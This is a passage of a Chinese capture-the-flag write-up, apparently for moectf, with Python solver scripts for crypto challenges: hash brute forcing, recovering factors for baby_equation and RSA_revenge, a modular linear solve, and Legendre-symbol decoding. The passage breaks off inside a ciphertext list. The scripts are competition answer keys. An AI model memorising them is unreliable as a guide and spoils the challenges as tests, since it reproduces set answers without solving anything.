</span></span><span style=display:flex><span><span style=color:#75715e># 给定的哈希值</span>
</span></span><span style=display:flex><span>target_hash <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;3a5137149f705e4da1bf6742e62c018e3f7a1784ceebcb0030656a2b42f50b6a&#39;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 已知的秘密开头</span>
</span></span><span style=display:flex><span>prefix <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;2100&#39;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 暴力破解可能的秘密</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1000000</span>):  <span style=color:#75715e># 从 000000 到 999999</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># 格式化为 6 位数字，不足的前面补零</span>
</span></span><span style=display:flex><span>    suffix <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;</span><span style=color:#e6db74>{</span>i<span style=color:#e6db74>:</span><span style=color:#e6db74>06</span><span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>.</span>encode()
</span></span><span style=display:flex><span>    secrets <span style=color:#f92672>=</span> prefix <span style=color:#f92672>+</span> suffix
</span></span><span style=display:flex><span>    <span style=color:#75715e># 计算 SHA-256 哈希值</span>
</span></span><span style=display:flex><span>    hash_value <span style=color:#f92672>=</span> sha256(secrets)<span style=color:#f92672>.</span>hexdigest()
</span></span><span style=display:flex><span>    <span style=color:#75715e># 检查哈希值是否匹配</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> hash_value <span style=color:#f92672>==</span> target_hash:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Found secrets: </span><span style=color:#e6db74>{</span>secrets<span style=color:#f92672>.</span>decode()<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>
</span></span></code></pre></div><h2 id=baby_equation>baby_equation</h2><p>首先对这个进行化简
$$
((a^2 + 1)<em>(b^2 + 1) - 2</em>(a - b)<em>(a</em>b - 1)) == 4*(k + a*b)
$$</p><p>$$
(a+1)^2(b-1)^2=4k
$$</p><p>然后还有求a,b</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> gmpy2
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> long_to_bytes
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>find</span>(tot, index, ls):
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    递归查找函数，用于寻找合适的因子组合，使得通过这些因子构造出的数字能够还原出 flag。
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    :param tot: 当前的乘积值（初始值为1）。
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    :param index: 当前处理的因子索引。
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    :param ls: 因子列表，包含所有可能的因子。
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    :return: 满足条件的乘积值，如果未找到则返回0。
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># 基准情况：如果已经检查了所有因子</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> index <span style=color:#f92672>==</span> len(ls):
</span></span><span style=display:flex><span>        <span style=color:#75715e># 检查当前的 tot 是否可能包含 flag 的特征字符串（例如 &#39;moectf{&#39;）</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;moectf{&#39;</span> <span style=color:#f92672>in</span> long_to_bytes(tot):
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> tot  <span style=color:#75715e># 返回找到的值</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>  <span style=color:#75715e># 没找到返回 0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># 递归查找，尝试包含当前因子的情况</span>
</span></span><span style=display:flex><span>    a <span style=color:#f92672>=</span> find(tot <span style=color:#f92672>*</span> ls[index], index <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>, ls)
</span></span><span style=display:flex><span>    <span style=color:#75715e># 递归查找，尝试不包含当前因子的情况</span>
</span></span><span style=display:flex><span>    b <span style=color:#f92672>=</span> find(tot, index <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>, ls)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># 返回找到的非零结果</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> a <span style=color:#66d9ef>if</span> a <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span> <span style=color:#66d9ef>else</span> b
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 给定的常量 k 值</span>
</span></span><span style=display:flex><span>k <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x2227e398fc6ffcf5159863a345df85ba50d6845f8c06747769fee78f598e7cb1bcf875fb9e5a69ddd39da950f21cb49581c3487c29b7c61da0f584c32ea21ce1edda7f09a6e4c3ae3b4c8c12002bb2dfd0951037d3773a216e209900e51c7d78a0066aa9a387b068acbd4fb3168e915f306ba40</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 计算 a1b1 = sqrt(4 * k)</span>
</span></span><span style=display:flex><span>a1b1 <span style=color:#f92672>=</span> gmpy2<span style=color:#f92672>.</span>iroot(<span style=color:#ae81ff>4</span> <span style=color:#f92672>*</span> k, <span style=color:#ae81ff>2</span>)[<span style=color:#ae81ff>0</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 因子列表，包含可能分解出的因子组合</span>
</span></span><span style=display:flex><span>fac <span style=color:#f92672>=</span> [
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>31</span>, <span style=color:#ae81ff>61</span>, <span style=color:#ae81ff>223</span>, <span style=color:#ae81ff>4013</span>, <span style=color:#ae81ff>281317</span>, <span style=color:#ae81ff>4151351</span>, <span style=color:#ae81ff>339386329</span>, <span style=color:#ae81ff>370523737</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>5404604441993</span>, <span style=color:#ae81ff>26798471753993</span>, <span style=color:#ae81ff>25866088332911027256931479223</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>64889106213996537255229963986303510188999911</span>
</span></span><span style=display:flex><span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 使用递归查找因子组合，得到 a1</span>
</span></span><span style=display:flex><span>a1 <span style=color:#f92672>=</span> find(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, fac)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 计算 b1 = a1b1 // a1</span>
</span></span><span style=display:flex><span>b1 <span style=color:#f92672>=</span> a1b1 <span style=color:#f92672>//</span> a1
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 使用 long_to_bytes 将 a1 和 b1 转换为字节并输出 flag</span>
</span></span><span style=display:flex><span>print(long_to_bytes(a1 <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>+</span> long_to_bytes(b1 <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>))
</span></span></code></pre></div><h2 id=new_system>new_system</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> gmpy2
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> long_to_bytes
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 给定的值</span>
</span></span><span style=display:flex><span>a1, c1 <span style=color:#f92672>=</span> [<span style=color:#ae81ff>48152794364522745851371693618734308982941622286593286738834529420565211572487</span>, <span style=color:#ae81ff>21052760152946883017126800753094180159601684210961525956716021776156447417961</span>]
</span></span><span style=display:flex><span>a2, c2 <span style=color:#f92672>=</span> [<span style=color:#ae81ff>48649737427609115586886970515713274413023152700099032993736004585718157300141</span>, <span style=color:#ae81ff>6060718815088072976566240336428486321776540407635735983986746493811330309844</span>]
</span></span><span style=display:flex><span>a, c <span style=color:#f92672>=</span> [<span style=color:#ae81ff>30099883325957937700435284907440664781247503171217717818782838808179889651361</span>, <span style=color:#ae81ff>85333708281128255260940125642017184300901184334842582132090488518099650581761</span>]
</span></span><span style=display:flex><span>q <span style=color:#f92672>=</span> <span style=color:#ae81ff>105482865285555225519947662900872028851795846950902311343782163147659668129411</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>b <span style=color:#f92672>=</span> (c <span style=color:#f92672>-</span> c1 <span style=color:#f92672>-</span> c2) <span style=color:#f92672>%</span> q
</span></span><span style=display:flex><span>d <span style=color:#f92672>=</span> (a <span style=color:#f92672>-</span> a1 <span style=color:#f92672>-</span> a2) <span style=color:#f92672>%</span> q
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>assert</span> b <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>assert</span> d <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>assert</span> gmpy2<span style=color:#f92672>.</span>gcd(d, q) <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>inv_d <span style=color:#f92672>=</span> gmpy2<span style=color:#f92672>.</span>invert(d, q)
</span></span><span style=display:flex><span>x <span style=color:#f92672>=</span> (b <span style=color:#f92672>*</span> inv_d) <span style=color:#f92672>%</span> q
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;The value of x is: </span><span style=color:#e6db74>{</span>x<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>gift <span style=color:#f92672>=</span> (c <span style=color:#f92672>-</span> a <span style=color:#f92672>*</span> x) <span style=color:#f92672>%</span> q
</span></span><span style=display:flex><span>print(long_to_bytes(gift))
</span></span></code></pre></div><h2 id=rsa_revenge>RSA_revenge</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> long_to_bytes
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> gmpy2
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 给定的数值</span>
</span></span><span style=display:flex><span>n <span style=color:#f92672>=</span> <span style=color:#ae81ff>141326884939079067429645084585831428717383389026212274986490638181168709713585245213459139281395768330637635670530286514361666351728405851224861268366256203851725349214834643460959210675733248662738509224865058748116797242931605149244469367508052164539306170883496415576116236739853057847265650027628600443901</span>
</span></span><span style=display:flex><span>c <span style=color:#f92672>=</span> <span style=color:#ae81ff>47886145637416465474967586561554275347396273686722042112754589742652411190694422563845157055397690806283389102421131949492150512820301748529122456307491407924640312270962219946993529007414812671985960186335307490596107298906467618684990500775058344576523751336171093010950665199612378376864378029545530793597</span>
</span></span><span style=display:flex><span>e <span style=color:#f92672>=</span> <span style=color:#ae81ff>65537</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 初始的 Brute Force 用于寻找 p 和 q</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>brute_force</span>(a, b, k):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> k <span style=color:#f92672>==</span> <span style=color:#ae81ff>256</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> a <span style=color:#f92672>*</span> b <span style=color:#f92672>==</span> n:
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;找到因子: a=</span><span style=color:#e6db74>{</span>a<span style=color:#e6db74>}</span><span style=color:#e6db74>, b=</span><span style=color:#e6db74>{</span>b<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> a, b
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>2</span>):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> j <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>2</span>):
</span></span><span style=display:flex><span>            a1 <span style=color:#f92672>=</span> a <span style=color:#f92672>+</span> i <span style=color:#f92672>*</span> (<span style=color:#ae81ff>2</span> <span style=color:#f92672>**</span> (<span style=color:#ae81ff>511</span> <span style=color:#f92672>-</span> k)) <span style=color:#f92672>+</span> j <span style=color:#f92672>*</span> (<span style=color:#ae81ff>2</span> <span style=color:#f92672>**</span> k)
</span></span><span style=display:flex><span>            b1 <span style=color:#f92672>=</span> b <span style=color:#f92672>+</span> j <span style=color:#f92672>*</span> (<span style=color:#ae81ff>2</span> <span style=color:#f92672>**</span> (<span style=color:#ae81ff>511</span> <span style=color:#f92672>-</span> k)) <span style=color:#f92672>+</span> i <span style=color:#f92672>*</span> (<span style=color:#ae81ff>2</span> <span style=color:#f92672>**</span> k)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> a1 <span style=color:#f92672>*</span> b1 <span style=color:#f92672>&gt;</span> n:
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>continue</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (a1 <span style=color:#f92672>+</span> <span style=color:#ae81ff>2</span> <span style=color:#f92672>**</span> (<span style=color:#ae81ff>511</span> <span style=color:#f92672>-</span> k)) <span style=color:#f92672>*</span> ((b1 <span style=color:#f92672>+</span> <span style=color:#ae81ff>2</span> <span style=color:#f92672>**</span> (<span style=color:#ae81ff>511</span> <span style=color:#f92672>-</span> k))) <span style=color:#f92672>&lt;</span> n:
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>continue</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (a1 <span style=color:#f92672>*</span> b1) <span style=color:#f92672>%</span> (<span style=color:#ae81ff>2</span> <span style=color:#f92672>**</span> (k <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>)) <span style=color:#f92672>!=</span> n <span style=color:#f92672>%</span> (<span style=color:#ae81ff>2</span> <span style=color:#f92672>**</span> (k <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>)):
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>continue</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            result <span style=color:#f92672>=</span> brute_force(a1, b1, k <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> result:
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> result
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 调用 Brute Force 函数来找到 p 和 q</span>
</span></span><span style=display:flex><span>p, q <span style=color:#f92672>=</span> brute_force(<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># RSA 解密函数</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>decrypt_rsa</span>(p, q, c, e):
</span></span><span style=display:flex><span>    <span style=color:#75715e># 计算模数 n 和 Euler&#39;s totient (phi)</span>
</span></span><span style=display:flex><span>    n <span style=color:#f92672>=</span> p <span style=color:#f92672>*</span> q
</span></span><span style=display:flex><span>    phi <span style=color:#f92672>=</span> (p <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>*</span> (q <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># 计算私钥 d</span>
</span></span><span style=display:flex><span>    d <span style=color:#f92672>=</span> gmpy2<span style=color:#f92672>.</span>invert(e, phi)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># 使用私钥解密密文</span>
</span></span><span style=display:flex><span>    m <span style=color:#f92672>=</span> pow(c, d, n)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> long_to_bytes(m)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 解密并打印结果</span>
</span></span><span style=display:flex><span>plaintext <span style=color:#f92672>=</span> decrypt_rsa(p, q, c, e)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;解密后的明文: </span><span style=color:#e6db74>{</span>plaintext<span style=color:#f92672>.</span>decode()<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span></code></pre></div><h2 id=ezlegendre>ezlegendre</h2><p>对于密文中的每个数字 n，我们计算 (n-a | p) 的勒让德符号。</p><p>如果勒让德符号为 1，则对应的原始比特为 1；否则为 0。</p><p>我们将所有解密出的比特拼接成一个二进制字符串。</p><p>最后，我们将二进制字符串每8位转换为一个ASCII字符，得到最终的明文</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> sympy <span style=color:#f92672>import</span> legendre_symbol
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>decrypt_flag</span>(ciphertext, p, a):
</span></span><span style=display:flex><span>    plaintext <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> n <span style=color:#f92672>in</span> ciphertext:
</span></span><span style=display:flex><span>        <span style=color:#75715e># 计算勒让德符号 (n|p) 和 (a|p)</span>
</span></span><span style=display:flex><span>        leg_n <span style=color:#f92672>=</span> legendre_symbol(n, p)
</span></span><span style=display:flex><span>        leg_a <span style=color:#f92672>=</span> legendre_symbol(a, p)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e># 如果 (n|p) == (a|p)，则原始比特为 0，否则为 1</span>
</span></span><span style=display:flex><span>        bit <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;0&#39;</span> <span style=color:#66d9ef>if</span> leg_n <span style=color:#f92672>==</span> leg_a <span style=color:#66d9ef>else</span> <span style=color:#e6db74>&#39;1&#39;</span>
</span></span><span style=display:flex><span>        plaintext <span style=color:#f92672>+=</span> bit
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># 将二进制字符串转换为ASCII字符</span>
</span></span><span style=display:flex><span>    flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0</span>, len(plaintext), <span style=color:#ae81ff>8</span>):
</span></span><span style=display:flex><span>        byte <span style=color:#f92672>=</span> plaintext[i:i <span style=color:#f92672>+</span> <span style=color:#ae81ff>8</span>]
</span></span><span style=display:flex><span>        flag <span style=color:#f92672>+=</span> chr(int(byte, <span style=color:#ae81ff>2</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> flag
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 给定的参数</span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> <span style=color:#ae81ff>303597842163255391032954159827039706827</span>
</span></span><span style=display:flex><span>a <span style=color:#f92672>=</span> <span style=color:#ae81ff>34032839867482535877794289018590990371</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 从给定的输出中提取密文</span>
</span></span><span style=display:flex><span>ciphertext <span style=color:#f92672>=</span> [<span style=color:#ae81ff>278121435714344315140568219459348432240</span>, <span style=color:#ae81ff>122382422611852957172920716982592319058</span>, <span style=color:#ae81ff>191849618185577692976529819600455462899</span>, <span style=color:#ae81ff>94093446512724714011050732403953711672</span>, <span style=color:#ae81ff>201558180013426239467911190374373975458</span>, <span style=color:#ae81ff>68492033218601874497788216187574770779</span>, <span style=color:#ae81ff>126947642955989000352009944664122898350</span>, <span style=color:#ae81ff>219437945679126072290321638679586528971</span>, <span style=color:#ae81ff>10408701004947909240690738287845627083</span>, <span style=color:#ae81ff>219535988722666848383982192122753961</span>, <span style=color:#ae81ff>173567637131203826362373646044183699942</span>, <span style=color:#ae81ff>80338874032631996985988465309690317981</span>, <span style=color:#ae81ff>61648326003245372053550369002454592176</span>, <span style=color:#ae81ff>277054378705807456129952597025123788853</span>, <span style=color:#ae81ff>17470857904503332214835106820566514388</span>, <span style=color:#ae81ff>107319431827283329450772973114594535432</span>, <span style=color:#ae81ff>238441423134995169136195506348909981918</span>, <span style=color:#ae81ff>99883768658373018345315220015462465736</span>, <span style=color:#ae81ff>188411315575174906660227928060309276647</span>, <span style=color:#ae81ff>295943321241733900048293164549062087749</span>, <span style=color:#ae81ff>262338278682686249081320491433984960912</span>, <span style=color:#ae81ff>22801563060010960126532333242621361398</span>, <span style=color:#ae81ff>36078000835066266368898887303720772866</span>, <span style=color:#ae81ff>247425961449456125528957438120145449797</span>, <span style=color:#ae81ff>843438089399946244829648514213686381</span>, <span style=color:#ae81ff>134335534828960937622820717215822744145</span>, <span style=color:#ae81ff>74167533116771086420478022805099354924</span>, <span style=color:#ae81ff>249545124784428362766858349552876226287</span>, <span style=color:#ae81ff>37282715721530125580150140869828301122</span>, <span style=color:#ae81ff>196898478251078084893324399909636605522</span>, <span style=color:#ae81ff>238696815190757698227115893728186526132</span>, <span style=color:#ae81ff>299823696269712032566096751491934189084</span>, <span style=color:#ae81ff>36767842703053676220422513310147909442</span>, <span style=color:#ae81ff>281632109692842887259013724387076511623</span>, <span style=color:#ae81ff>205224361514529735350420756653899454354</span>, <span style=color:#ae81ff>129596988754151892987950536398173236050</span>, <span style=color:#ae81ff>97446545236373291551224026108880226180</span>, <span style=color:#ae81ff>14756086145599449889630210375543256004</span>, <span style=color:#ae81ff>286168982698537894139229515711563677530</span>, <span style=color:#ae81ff>100213185917356165383902831965625948491</span>, <span style=color:#ae81ff>268158998117979449824644211372962370753</span>, <span style=color:#ae81ff>264445941122079798432485452672458533870</span>, <span style=color:#ae81ff>87798213581165493463875527911737074678</span>, <span style=color:#ae81ff>131092115794704283915645135973964447801</span>, <span style=color:#ae81ff>164706020771920540681638256590936188046</span>, <span style=color:#ae81ff>178911145710348095185845690896985420147</span>, <span style=color:#ae81ff>154776411353263771717768237918437437524</span>, <span style=color:#ae81ff>260700611701259748940616668959555019434</span>, <span style=color:#ae81ff>222035631087536380654643071679210307962</span>, <span style=color:#ae81ff>281292430628313502184158157303993732703</span>, <span style=color:#ae81ff>24585161817233257375093541076165757776</span>, <span style=color:#ae81ff>269816384363209013058085915818661743171</span>, <span style=color:#ae81ff>39975571110634682056180877801094873602</span>, <span style=color:#ae81ff>125235869385356820424712474803526156473</span>, <span style=color:#ae81ff>218090799597950517977618266111343968738</span>, <span style=color:#ae81ff>144927096680470512196610409630841999788</span>, <span style=color:#ae81ff>213811208492716237073777701143156745108</span>, <span style=color:#ae81ff>64650890972496600196147221913475681291</span>, <span style=color:#ae81ff>302694535366090904732833802133573214043</span>, <span style=color:#ae81ff>214939649183312746702067838266793720455</span>, <span style=color:#ae81ff>219122905927283854730628133811860801459</span>, <span style=color:#ae81ff>224882607595640234803004206355378578645</span>, <span style=color:#ae81ff>260797062521664439666117613111279885285</span>, <span style=color:#ae81ff>279805661574982797810336125346375782066</span>, <span style=color:#ae81ff>147173814739967617543091047462951522968</span>, <span style=color:#ae81ff>23908277835281045050455945166237585493</span>, <span style=color:#ae81ff>186338363482466926309454195056482648936</span>, <span style=color:#ae81ff>295140548360506354817984847059061185817</span>, <span style=color:#ae81ff>151948366859968493761034274719548683660</span>, <span style=color:#ae81ff>96829048650546562162402357888582895187</span>, <span style=color:#ae81ff>61129603762762161772506800496463804206</span>, <span style=color:#ae81ff>83474322431616849774020088719454672415</span>, <span style=color:#ae81ff>25094865151197136947956010155927090038</span>, <span style=color:#ae81ff>86284568910378075382309315924388555908</span>, <span style=color:#ae81ff>269311313874077441782483719283243368999</span>, <span style=color:#ae81ff>293865655623484061732669067594899514872</span>, <span style=color:#ae81ff>42618744258317592068586041005421369378</span>, <span style=color:#ae81ff>54330626035773013687614797098120791595</span>, <span style=color:#ae81ff>147903584483139198945881545544727290390</span>, <span style=color:#ae81ff>290219451327796902155034830296135328101</span>, <span style=color:#ae81ff>147951591390019765447087623264411247959</span>, <span style=color:#ae81ff>176721307425594106045985172455880551666</span>, <span style=color:#ae81ff>10617017342351249793850566048327751981</span>, <span style=color:#ae81ff>166002147246002788729535202156354835048</span>, <span style=color:#ae81ff>43653265786517886972591512103899543742</span>, <span style=color:#ae81ff>191250321143079662898769478274249620839</span>, <span style=color:#ae81ff>142288830015965036385306900781029447609</span>, <span style=color:#ae81ff>231943053864301712428957240550789860578</span>, <span style=color:#ae81ff>259705854206260213018172677443232515015</span>, <span style=color:#ae81ff>42547692646223561211915772930251024103</span>, <span style=color:#ae81ff>210863755365631055277867177762462471179</span>, <span style=color:#ae81ff>140297326776889591830655052829600610449</span>, <span style=color:#ae81ff>136970598261461830690726521708413303997</span>, <span style=color:#ae81ff>93221970399798040564077738881047391445</span>, <span style=color:#ae81ff>192314170920206027886439562261321846026</span>, <span style=color:#ae81ff>95904582457122325051140875987053990027</span>, <span style=color:#ae81ff>158334009503860664724416914265160737388</span>, <span style=color:#ae81ff>134039922705083767606698907224295596883</span>, <span style=color:#ae81ff>7789601161004867293103537392246577269</span>, <span style=color:#ae81ff>261069289329878459425835380641261840913</span>, <span style=color:#ae81ff>123743427894205417735664872035238090896</span>, <span style=color:#ae81ff>20126583572929979071576315733108811761</span>, <span style=color:#ae81ff>5317214299018099740195727361345674110</span>, <span style=color:#ae81ff>68965882674411789667953455991785095270</span>, <span style=color:#ae81ff>235934145208367401015357242228361016868</span>, <span style=color:#ae81ff>250709310980093244562698210062174570956</span>, <span style=color:#ae81ff>167048130489822745377277729681835553856</span>, <span style=color:#ae81ff>122439593796334321806299678109589886368</span>, <span style=color:#ae81ff>117953800124952553873241816859976377866</span>, <span style=color:#ae81ff>226311466875372429157352019491582796620</span>, <span style=color:#ae81ff>301401080214561977683439914412806833619</span>, <span style=color:#ae81ff>255816105091394723475431389696875064495</span>, <span style=color:#ae81ff>73243049441397892506665249226961409560</span>, <span style=color:#ae81ff>226985189100195407227032930008331832009</span>, <span style=color:#ae81ff>164462051705780513134747720427967016844</span>, <span style=color:#ae81ff>97905180778488273557095248936896399883</span>, <span style=color:#ae81ff>40737879120410802220891174679005117779</span>, <span style=color:#ae81ff>180413920169781019749877067396006212488</span>, <span style=color:#ae81ff>171309368917976988181007951396904157090</span>, <span style=color:#ae81ff>215065878665354148046787050342635722874</span>, <span style=color:#ae81ff>54225964222741166664978354789209176721</span>, <span style=color:#ae81ff>179980445108969868669560591527220171967</span>, <span style=color:#ae81ff>39118880593034932654127449293138635964</span>, <span style=color:#ae81ff>170210538859699997092506207353260760212</span>, <span style=color:#ae81ff>62152643864232748107111075535730424573</span>, <span style=color:#ae81ff>28285579676042878568229909932560645217</span>, <span style=color:#ae81ff>69823876778445954036922428013285910904</span>, <span style=color:#ae81ff>170371231064701443428318684885998283021</span>, <span style=color:#ae81ff>211884923965526285445904695039560930451</span>, <span style=color:#ae81ff>2912793651373467597058997684762696593</span>, <span style=color:#ae81ff>220544861190999177045275484705781090327</span>, <span style=color:#ae81ff>142755270297166955179253470066788794096</span>, <span style=color:#ae81ff>264271123927382232040584192781810655563</span>, <span style=color:#ae81ff>214901195876112453126242978678182365781</span>, <span style=color:#ae81ff>252916600207311996808457367909175218824</span>, <span style=color:#ae81ff>176399700725319294248909617737135018444</span>, <span style=color:#ae81ff>230677646264271256129104604724615560658</span>, <span style=color:#ae81ff>1568101696521094800575010545520002520</span>, <span style=color:#ae81ff>276644650735844694794889591823343917140</span>, <span style=color:#ae81ff>185355461344975191330786362319126511681</span>, <span 